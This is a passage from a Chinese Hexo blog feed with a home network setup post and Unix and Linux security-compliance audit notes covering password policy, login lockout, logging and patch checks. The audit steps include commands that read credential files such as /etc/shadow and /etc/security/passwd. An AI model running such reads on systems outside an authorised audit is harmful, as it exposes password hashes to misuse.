      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>前段时间忙于搬家，现在闲下来把新家的网络设计情况理了理</p></blockquote><a id="more"></a><h1 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h1><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/jiayongwangluo/家用网络.jpg" alt="拓扑结构" title="" class="">                <p>拓扑结构</p>            </figure><h1 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h1><h2 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h2><blockquote><ul><li>电信300M带宽</li><li>光纤入户</li></ul></blockquote><h2 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h2><blockquote><ul><li style="list-style: none"><input type="checkbox" checked> 天翼网关1台</li><li style="list-style: none"><input type="checkbox" checked> 交换机1台</li><li style="list-style: none"><input type="checkbox" checked> 集线器1个</li><li style="list-style: none"><input type="checkbox" checked> 无线路由2台</li><li style="list-style: none"><input type="checkbox" checked> 无线信号放大器3个</li><li style="list-style: none"><input type="checkbox" checked> 摄像头4个</li><li style="list-style: none"><input type="checkbox" checked> 摄像头控制设备1台</li></ul></blockquote><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><blockquote><ul><li style="list-style: none"><input type="checkbox" checked> 网线标签贴若干</li><li style="list-style: none"><input type="checkbox" checked> 网线若干</li><li style="list-style: none"><input type="checkbox" checked> T型台卡扫码牌1个</li></ul></blockquote><h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><h2 id="天翼网关"><a href="#天翼网关" class="headerlink" title="天翼网关"></a>天翼网关</h2><blockquote><ul><li>考虑办理电信送的设备性能情况，不开启网关的wifi功能</li><li>设置dhcp地址池<figure class="image-box">                <img src="https://bp.yuanlichenai.cn/jiayongwangluo/2019-02-04-14-47-23.png" alt="" title="" class="">                <p></p>            </figure></li></ul></blockquote><h2 id="master网络"><a href="#master网络" class="headerlink" title="master网络"></a>master网络</h2><blockquote><ul><li>自动获取地址</li><li>使用华为智能家居APP管理CD28和无线信号放大器</li></ul></blockquote><h2 id="guest网络"><a href="#guest网络" class="headerlink" title="guest网络"></a>guest网络</h2><blockquote><ul><li>guest路由器版本较老，为了方便管理设置静态地址<figure class="image-box">                <img src="https://bp.yuanlichenai.cn/jiayongwangluo/2019-02-04-14-40-37.png" alt="地址设置" title="" class="">                <p>地址设置</p>            </figure></li><li>开启外网web登录<figure class="image-box">                <img src="https://bp.yuanlichenai.cn/jiayongwangluo/2019-02-04-14-43-11.png" alt="允许web访问与ping连接" title="" class="">                <p>允许web访问与ping连接</p>            </figure></li></ul></blockquote><h2 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h2><blockquote><ul><li>所有监控设备IP地址调整至200以后</li><li>监控设备通过集线器相连</li><li>使用监控APP管理监控视频</li></ul></blockquote><h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><h2 id="核心部分"><a href="#核心部分" class="headerlink" title="核心部分"></a>核心部分</h2><blockquote><ul><li>交换机开启MTU VLAN，使内网设备间无法互相访问（监控设备通过集线器进行通讯）<figure class="image-box">                <img src="https://bp.yuanlichenai.cn/jiayongwangluo/2019-02-04-15-02-58.png" alt="MTU VLAN" title="" class="">                <p>MTU VLAN</p>            </figure></li></ul></blockquote><h2 id="guest网络-1"><a href="#guest网络-1" class="headerlink" title="guest网络"></a>guest网络</h2><blockquote><ul><li>guest网络由于集线器物理限制至100mbps（其实因为tv线的关系网线的8个铜线被剪成两根每根4铜线了，接交换机速度也跑不上去。。。）</li><li>启用站点限制功能，使guest网络内用户无法访问核心网络<figure class="image-box">                <img src="https://bp.yuanlichenai.cn/jiayongwangluo/2019-02-04-15-10-21.png" alt="站点限制" title="" class="">                <p>站点限制</p>            </figure></li></ul></blockquote><h1 id="其它-1"><a href="#其它-1" class="headerlink" title="其它"></a>其它</h1><ul><li>为所有网线贴上标签方便标识<figure class="image-box">                <img src="https://bp.yuanlichenai.cn/jiayongwangluo/2019-02-04-15-16-03.jpg" alt="网线标签" title="" class="">                <p>网线标签</p>            </figure></li><li>设置扫码连接wifi，<a href="/2018/07/03/Tutorial/Wifi-QRcode/">设置方法</a><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/jiayongwangluo/2019-02-04-15-23-57.jpg" alt="guest网络" title="" class="">                <p>guest网络</p>            </figure></li></ul><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 家庭网络 </tag>
            
            <tag> 拓扑图 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>UnixDJBH</title>
      <link href="/2019/01/09/UnixDJBH/"/>
      <url>/2019/01/09/UnixDJBH/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>Unix等保笔记</p></blockquote><a id="more"></a><h1 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h1><figure class="highlight bash"><figcaption><span>AIX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oslevel -r</span><br></pre></td></tr></table></figure><h1 id="身份鉴别"><a href="#身份鉴别" class="headerlink" title="身份鉴别"></a>身份鉴别</h1><h2 id="密码策略"><a href="#密码策略" class="headerlink" title="密码策略"></a>密码策略</h2><figure class="highlight bash"><figcaption><span>AIX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/etc/security/user</span><br><span class="line"><span class="comment"># 参数</span></span><br><span class="line">maxage：8     <span class="comment">#密码有效的星期数，指出两次修改密码之间的距离最长时间，在这个时间之前用户必须修改密码，该属性的值是一个正整数，范围为0-52.当为0时表示没有最短时间限制</span></span><br><span class="line">minlen：8     <span class="comment">#密码的最短长度，值的范围为0到8,0表示没有限制</span></span><br><span class="line">minalpha：2   <span class="comment">#新密码中含有字符的最少个数，这是一个正整数的值，他的范围为0到8，为0时表示没有最少字符限制</span></span><br><span class="line">maxrepeats：3 <span class="comment">#在新密码中相同支付出现的最大次数，0表示无限制，8表示没有最大数目的限制</span></span><br><span class="line">mindiff：4    <span class="comment">#指旧密码中的字符在新密码中出现的最小个数，该属性值是个正整数，范围为0到8.0表示没有限制</span></span><br><span class="line">minother：2   <span class="comment">#新密码中含有非字母字符的最少个数，这是一个正整数的值，他的范围是0到8,，为0表示无最少非字母字符数限制flags不为NOCHECK</span></span><br><span class="line">histexpire：  <span class="comment">#该用户在多个个星期内不能重复使用相同的密码，该属性是一个正整数，值的范围在0到260，若为0表示没有这个限制，推荐值为26（大约6个月）</span></span><br><span class="line">histsize：    <span class="comment">#该用户不能重复使用以前的密码（旧密码）的数，该属性的值是一个正整数，值的范围是0到50</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>HP-UX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/etc/default/security</span><br><span class="line"><span class="comment"># 参数</span></span><br><span class="line">MIN_PASSWORD_LENGTH=8 <span class="comment">#最短密码长度</span></span><br><span class="line">PASSWORD_HISTORY_DEPTH=5 <span class="comment">#密码历史</span></span><br><span class="line">PASSWORD_MIN_UPPER_CASE_CHARS=1 <span class="comment">#最小大写字母个数</span></span><br><span class="line">PASSWORD_MIN_LOWER_CASE_CHARS=1 <span class="comment">#最小小写字母个数</span></span><br><span class="line">PASSWORD_MIN_DIGIT_CHARS=1 <span class="comment">#最小数字个数</span></span><br><span class="line">PASSWORD_MIN_SPECIAL_CHARS=1 <span class="comment">#最小特殊字符个数</span></span><br><span class="line">PASSWORD_MAXDAYS=90 <span class="comment">#最长有效期</span></span><br><span class="line">PASSWORD_MINDAYS=14 <span class="comment">#最短有效期</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果上述策略文件未配置，则查看是否开启了信任模式（trusted system），如果开启了，查看以下内容：</span></span><br><span class="line">SAM-Auditing and Security-System Security Policies-password format policies</span><br><span class="line">SAM-Auditing and Security-System Security Policies-password format policies-Maximum Password Length</span><br><span class="line">SAM-Auditing and Security-System Security Policies-password Aging policies-password expiration time(days)</span><br><span class="line">SAM-Auditing and Security-System Security Policies-password Aging policies-password life time(days)</span><br></pre></td></tr></table></figure><h2 id="口令更换时间"><a href="#口令更换时间" class="headerlink" title="口令更换时间"></a>口令更换时间</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/security/passwd</span><br><span class="line">perl -le <span class="string">'print scalar localtime 1200982154'</span></span><br></pre></td></tr></table></figure><h2 id="登录失败"><a href="#登录失败" class="headerlink" title="登录失败"></a>登录失败</h2><figure class="highlight bash"><figcaption><span>AIX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/security/login.cfg</span><br><span class="line">logindisable:5    <span class="comment">#5次失败登录后锁定端口</span></span><br><span class="line">logininterval:60  <span class="comment">#在60秒内5次失败登录才锁定端口</span></span><br><span class="line">loginreenable：30 <span class="comment">#端口锁定30分钟后解锁</span></span><br><span class="line"></span><br><span class="line">/etc/security/user</span><br><span class="line">loginretries=5    <span class="comment">#密码输错5次账户锁定,0表示不限制</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>HP-UX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/default/security</span><br><span class="line"><span class="comment"># 参数</span></span><br><span class="line">AUTH_MAXTRIES</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果上述策略文件未配置，则查看是否开启了信任模式（trusted system），如果开启了，查看以下内容：</span></span><br><span class="line">SAM-Auditing and Security-System Security Policies-General User Account policies-Unsunccessful Login Tries Allowed</span><br></pre></td></tr></table></figure><h2 id="远程协议"><a href="#远程协议" class="headerlink" title="远程协议"></a>远程协议</h2><h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><h2 id="umask"><a href="#umask" class="headerlink" title="umask"></a>umask</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认值</span></span><br><span class="line">022</span><br><span class="line"><span class="comment"># 推荐值</span></span><br><span class="line">077</span><br></pre></td></tr></table></figure><h1 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h1><h2 id="审计进程"><a href="#审计进程" class="headerlink" title="审计进程"></a>审计进程</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef|grep syslog <span class="comment">#syslog</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>AIX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">audit query <span class="comment">#audit</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>HP</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SAM-Auditing and Security-Audited users <span class="comment">#打开对所有用户的审计</span></span><br></pre></td></tr></table></figure><h2 id="审计内容"><a href="#审计内容" class="headerlink" title="审计内容"></a>审计内容</h2><figure class="highlight bash"><figcaption><span>AIX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件</span></span><br><span class="line">audit query</span><br><span class="line">/etc/syslog.conf</span><br><span class="line"><span class="comment"># 配置信息</span></span><br><span class="line">kern    <span class="comment">#由kernel产生的信息；</span></span><br><span class="line">user    <span class="comment">#由用户进行产生的信息；</span></span><br><span class="line">mail    <span class="comment">#邮件系统产生的信息；</span></span><br><span class="line">daemon  <span class="comment">#系统守护进程的信息；</span></span><br><span class="line">auth    <span class="comment">#由login，su，getty等进行身份认证时产生的信息；</span></span><br><span class="line">syslog  <span class="comment">#由syslogd自己内部产生的信息；</span></span><br><span class="line">uucp    <span class="comment">#UUCP系统信息；</span></span><br><span class="line">cron    <span class="comment">#cron和at工具信息；</span></span><br><span class="line">emerg   <span class="comment">#紧急，通常应广播到所有用户；</span></span><br><span class="line">alert   <span class="comment">#告警，当前状态必须立即进行纠正。例如，系统数据库崩溃；</span></span><br><span class="line">crit    <span class="comment">#关键状态的警告。例如，硬件故障；</span></span><br><span class="line">err     <span class="comment">#其他错误；</span></span><br><span class="line">warning <span class="comment">#警告；</span></span><br><span class="line">notice  <span class="comment">#注意；非错误状态的报告，但应特别处理；</span></span><br><span class="line">info    <span class="comment">#通报信息；</span></span><br><span class="line">debug   <span class="comment">#调试程序时的信息。</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>HP-UX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SAM-Auditing and Security-Audited Event <span class="comment">#打开对admin，login，modacccess，moddac事件的审计</span></span><br><span class="line">/etc/syslog.conf</span><br></pre></td></tr></table></figure><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><figure class="highlight bash"><figcaption><span>AIX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/adm/message</span><br><span class="line">/var/adm/sulog </span><br><span class="line">/var/adm/wtmp </span><br><span class="line">/etc/utmp/security/faillogin </span><br><span class="line">/etc/security/lastlog</span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>HP-UX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/.audit/audfile1</span><br><span class="line">/var/.audit/audfile2</span><br><span class="line">/var/adm/syslog/*.<span class="built_in">log</span></span><br></pre></td></tr></table></figure><h1 id="入侵防范"><a href="#入侵防范" class="headerlink" title="入侵防范"></a>入侵防范</h1><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -lntp <span class="comment">#查看tcp端口</span></span><br><span class="line">netstat -lnup <span class="comment">#查看udp端口</span></span><br><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><figure class="highlight bash"><figcaption><span>AIX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lssrc -a <span class="comment">#查看所有系统组服务</span></span><br><span class="line">lssrc -a|grep active <span class="comment">#查看所有启动的服务</span></span><br></pre></td></tr></table></figure><h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/inetd.conf</span><br></pre></td></tr></table></figure><h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><figure class="highlight bash"><figcaption><span>AIX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">oslevel -r <span class="comment">#查看操作系统当前 AIX 版本达到的最高的推荐维护包</span></span><br><span class="line">oslevel -q <span class="comment">#查看操作系统已知的版本号和名称</span></span><br><span class="line">instfix -i | grep AIX_ML <span class="comment">#查看打了哪些补丁</span></span><br><span class="line">instfix -I | grep AIX_ML oslevel -r</span><br><span class="line">instfix -ivk IY07276 <span class="comment">#查看是否打了某个补丁</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>HP-UX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swlist -l bundle</span><br></pre></td></tr></table></figure><h1 id="资源控制"><a href="#资源控制" class="headerlink" title="资源控制"></a>资源控制</h1><h2 id="地址限制"><a href="#地址限制" class="headerlink" title="地址限制"></a>地址限制</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/hosts.allow</span><br><span class="line">/etc/hosts.deny</span><br><span class="line">/etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>HP-UX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/securetty <span class="comment">#console</span></span><br><span class="line">cat /var/adm/inetd.sec <span class="comment">#指定IP进行远程管理</span></span><br></pre></td></tr></table></figure><h2 id="超时锁定"><a href="#超时锁定" class="headerlink" title="超时锁定"></a>超时锁定</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件</span></span><br><span class="line">/etc/profile</span><br><span class="line">/etc/ssh/ssh_config</span><br><span class="line"><span class="comment"># 值</span></span><br><span class="line">TMOUT=120</span><br><span class="line">ConnectTimeout=120</span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>HP-UX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System Security Policies-Terminal Security Policies-Login Timeout Value</span><br></pre></td></tr></table></figure><h2 id="系统资源"><a href="#系统资源" class="headerlink" title="系统资源"></a>系统资源</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件</span></span><br><span class="line">/etc/security/limits.conf</span><br><span class="line"><span class="comment"># 1、fsize 用户创建的文件大小限制；</span></span><br><span class="line"><span class="comment"># 2、core 生成的core文件大小的限制；</span></span><br><span class="line"><span class="comment"># 3、cpu 用户进程可用cpu的限定值；</span></span><br><span class="line"><span class="comment"># 4、data 进程数据段大小的限定值；</span></span><br><span class="line"><span class="comment"># 5、stack 进程堆栈短大小的限定值；</span></span><br><span class="line"><span class="comment"># 6、rss 进程常驻内存段的限定值；</span></span><br><span class="line"><span class="comment"># 7、nofiles 进程中打开文件的最大数量。</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>HP-UX</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -a</span><br></pre></td></tr></table></figure><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> 等级保护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unix </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>LinuxDJBH</title>
      <link href="/2019/01/09/LinuxDJBH/"/>
      <url>/2019/01/09/LinuxDJBH/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>Linux等级保护2.0笔记</p></blockquote><a id="more"></a><h1 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看Linux 内核版本</span></span><br><span class="line">cat /proc/version</span><br><span class="line">uname –a</span><br><span class="line">uname –r</span><br><span class="line"><span class="comment"># 查看Linux 版本：</span></span><br><span class="line">lsb_release –a</span><br><span class="line">cat /etc/redhat-release</span><br><span class="line">cat /etc/centos-release</span><br><span class="line">rpm -q redhat-release</span><br><span class="line">rpm -q centos-release</span><br><span class="line">cat /etc/release <span class="comment">#Solaris</span></span><br></pre></td></tr></table></figure><h1 id="RedHat-CentOS"><a href="#RedHat-CentOS" class="headerlink" title="RedHat/CentOS"></a>RedHat/CentOS</h1><h2 id="身份鉴别"><a href="#身份鉴别" class="headerlink" title="身份鉴别"></a>身份鉴别</h2><h3 id="密码策略"><a href="#密码策略" class="headerlink" title="密码策略"></a>密码策略</h3><ul><li>/etc/login.defs</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认参数</span></span><br><span class="line">PASS_MAX_DAYS   99999</span><br><span class="line">PASS_MIN_DAYS   0</span><br><span class="line">PASS_MIN_LEN    5</span><br><span class="line">PASS_WARN_AGE   7</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推荐参数</span></span><br><span class="line">PASS_MAX_DAYS   90 <span class="comment">#密码有效期/天</span></span><br><span class="line">PASS_MIN_DAYS   1  <span class="comment">#更换密码的最小天数</span></span><br><span class="line">PASS_MIN_LEN    8  <span class="comment">#密码最小长度,实际无效，需要通过system-auth文件来进行控制</span></span><br><span class="line">PASS_WARN_AGE   7  <span class="comment">#密码失效前多少天开始警告</span></span><br></pre></td></tr></table></figure><ul><li>/etc/pam.d/system-auth</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参数</span></span><br><span class="line">password requisite pam_cracklib.so minlen=8 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1</span><br><span class="line"><span class="comment"># minlen=8 最小密码长度为8</span></span><br><span class="line"><span class="comment"># ucredit=-1 至少需要有一个大写字母</span></span><br><span class="line"><span class="comment"># lcredit=-1 至少需要有一个小写字母</span></span><br><span class="line"><span class="comment"># dcredit=-1 至少需要有一个数字</span></span><br><span class="line"><span class="comment"># ocredit=-1 至少需要一个除字母数字以外的其他字符</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>查看单个用户的密码策略</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">chage -l username</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数</span></span><br><span class="line">Last password change                                    : Dec 12, 2018 <span class="comment"># 上次修改时间</span></span><br><span class="line">Password expires                                        : never        <span class="comment"># 密码过期时间</span></span><br><span class="line">Password inactive                                       : never        <span class="comment"># 密码失效时间</span></span><br><span class="line">Account expires                                         : never        <span class="comment"># 帐户过期时间</span></span><br><span class="line">Minimum number of days between password change          : 0            <span class="comment"># 两次改变密码之间相距的最小天数</span></span><br><span class="line">Maximum number of days between password change          : 99999        <span class="comment"># 两次改变密码之间相距的最大天数</span></span><br><span class="line">Number of days of warning before password expires       : 7            <span class="comment"># 在密码过期之前警告的天数</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>口令更改时间</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过shadow文件计算</span></span><br><span class="line">cat /etc/shadow</span><br><span class="line">date -u -d <span class="string">"1970-01-01 UTC <span class="variable">$((16749 * 86400 )</span>) seconds"</span></span><br></pre></td></tr></table></figure><h3 id="登录失败"><a href="#登录失败" class="headerlink" title="登录失败"></a>登录失败</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件</span></span><br><span class="line">/etc/pam.d/system-auth</span><br><span class="line">/etc/pam.d/login</span><br><span class="line">/etc/pam.d/sshd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数</span></span><br><span class="line">auth required pam_tally2.so onerr=fail deny=5 unlock_time=100 even_deny_root root_unlock_time=100</span><br><span class="line"><span class="comment"># even_deny_root 也限制root用户；</span></span><br><span class="line"><span class="comment"># deny 设置普通用户和root用户连续错误登陆的最大次数，超过最大次数，则锁定该用户</span></span><br><span class="line"><span class="comment"># unlock_time 设定普通用户锁定后，多少时间后解锁，单位是秒；</span></span><br><span class="line"><span class="comment"># root_unlock_time 设定root用户锁定后，多少时间后解锁，单位是秒；</span></span><br><span class="line"></span><br><span class="line">account required /lib/security/pam tally.so deny=X no_magic_root reset</span><br></pre></td></tr></table></figure><h3 id="登录超时"><a href="#登录超时" class="headerlink" title="登录超时"></a>登录超时</h3><ul><li>/etc/profile</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TMOUT=120</span><br></pre></td></tr></table></figure><ul><li>/etc/ssh/ssh_config</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ConnectTimeout=120</span><br></pre></td></tr></table></figure><h3 id="远程管理协议"><a href="#远程管理协议" class="headerlink" title="远程管理协议"></a>远程管理协议</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service sshd status</span><br><span class="line">service telnetd status</span><br></pre></td></tr></table></figure><h3 id="双因子身份鉴别"><a href="#双因子身份鉴别" class="headerlink" title="双因子身份鉴别"></a>双因子身份鉴别</h3><h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><h2 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h2><h3 id="审计进程"><a href="#审计进程" class="headerlink" title="审计进程"></a>审计进程</h3><figure class="highlight bash"><figcaption><span>系统日志服务</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">service syslog status <span class="comment">#(CentOS6或redhat6以上为rsyslog)</span></span><br><span class="line">service auditd status</span><br><span class="line"><span class="comment">#或</span></span><br><span class="line">service --status-all | grep running</span><br><span class="line"><span class="comment">#查看进程</span></span><br><span class="line">PS -ef | grep syslog</span><br><span class="line">ps -ef | grep auditd</span><br></pre></td></tr></table></figure><h3 id="日志配置文件"><a href="#日志配置文件" class="headerlink" title="日志配置文件"></a>日志配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/audit/audit.rules</span><br></pre></td></tr></table></figure><ul><li>/etc/rsyslog.conf、/etc/syslog.conf</li></ul><figure class="highlight bash"><figcaption><span>rsyslog.conf文件</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 